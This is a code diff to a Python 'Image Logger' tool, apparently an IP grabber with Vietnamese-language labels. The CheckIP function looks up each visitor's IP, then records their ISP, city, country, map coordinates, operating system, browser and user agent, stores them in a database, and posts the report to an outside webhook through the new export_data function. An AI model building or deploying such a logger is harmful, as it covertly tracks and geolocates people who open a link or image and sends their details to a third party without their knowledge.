@@ -72,98 +72,58 @@ blacklistedIPs = ("27", "104", "143", "164")
 
 
 def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=None, port=None, filename=None, url_thumbnail=None, botname='Image Logger', db: Session = None):
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-            return
-        if config["vpnCheck"] == 1:
-            ping = ""
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
+    if not curd.check_ip_exist(ip, db=db):
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+        os, browser = httpagentparser.simple_detect(useragent)
+        if token:
+            if curd.check_exists_token(db, token=token):
+                logger_model = schemas.loggers(
+                    ip=f'{ip}',
+                    user_agents=str(useragent),
+                    device=f'{os} - {browser}',
+                    ip_info=str(info),
+                    filename=filename,
+                    token=token,
+                    time_stamp=timestamp,
+                    created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                )
+                logger_res = curd.create_logger(db, loggers=logger_model)
+                embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=token, url_thumnail=url_thumbnail, type='Success - ', id=logger_res.id)
+                res =requests.post(url, json=embed)
+                return logger_res
             else:
-                return
-        if config["antiBot"] == 3:
-            return
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-            ping = ""
-    os, browser = httpagentparser.simple_detect(useragent)
-    # color = config["color"] if token else config['color_error']
-    embed = {
-        "username": config["username"],
-        "avatar_url": config['image'],
-        "content": f"""**Image name: {filename}**
-> **IP:** `{ip if ip else 'Unknown'}:{port}`
-> **Token:** `{token if token else 'BruteForce server'}`
-> **Time:** `{timestamp}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-> **User Agent: **`{useragent}`
-""",
-    }
-
-    # if url:embed["embeds"][0].update({"thumbnail": {"url": url_thumbnail}})
-    res =requests.post(url, json=embed)
-    if token:
-        if curd.check_exists_token(db, token=token):
-            logger_model = schemas.loggers(
-                ip=f'{ip}',
-                user_agents=useragent,
-                device=f'{os} - {browser}',
-                ip_info=str(info),
-                filename=filename,
-                token=token,
-                time_stamp=timestamp,
-                created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            )
-            logger_res = curd.create_logger(db, loggers=logger_model)
-            return logger_res
+                logger_model_error = schemas.logger_error(
+                    ip=f'{ip}',
+                    user_agents=str(useragent),
+                    device=f'{os} - {browser}',
+                    ip_info=str(info),
+                    filename=filename,
+                    token=f'Unknow token: {token}',
+                    time_stamp=timestamp,
+                    created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                )
+                logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
+                embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=f'Unknow token: {token}', url_thumnail=url_thumbnail, type='Error - ', id=logger_res.id)
+                res =requests.post(url, json=embed)
+                return logger_res
         else:
             logger_model_error = schemas.logger_error(
                 ip=f'{ip}',
-                user_agents=useragent,
+                user_agents=str(useragent),
                 device=f'{os} - {browser}',
                 ip_info=str(info),
                 filename=filename,
-                token=f'Unknow token: {token}',
+                token='BruteForce server',
                 time_stamp=timestamp,
                 created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             )
-            logger_res = curd.create_logger_error(
-                db, logger_error=logger_model_error)
+            logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
+            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token='BruteForce server', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
+            res =requests.post(url, json=embed)
             return logger_res
-    else:
-        logger_model_error = schemas.logger_error(
-            ip=f'{ip}',
-            user_agents=useragent,
-            device=f'{os} - {browser}',
-            ip_info=str(info),
-            filename=filename,
-            token='BruteForce server',
-            time_stamp=timestamp,
-            created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        )
-        logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
-        return logger_res
 
 
+# Generate a random 8-character string
 def generate_random_string(length):
     # Define the characters to choose from
     characters = string.ascii_letters + string.digits
@@ -172,5 +132,20 @@ def generate_random_string(length):
     random_string = ''.join(random.choice(characters) for _ in range(length))
 
     return random_string
-
-# Generate a random 8-character string
+def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id):
+    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Loại IP: di động: {ip_info['mobile']}, proxy: {ip_info['proxy']}, hosting: {ip_info['hosting']}\n6. Vị trí tương đối: https://maps.google.com/?q={ip_info['lat']},{ip_info['lon']}\n7. {type}{id}"
+    embed = {
+        "username": "Thông tin truy cập IP",
+        "avatar_url": url_thumnail,
+        "content": info,
+        "embeds": [
+            {"author": {
+                "name": f'Image: {filename} - Token: {token}',
+                "icon_url": f'{url_thumnail}'
+                }
+            },
+            {
+            "title": ":apple:--------------:apple:-------------------:apple:"
+         }]
+    }
+    return embed
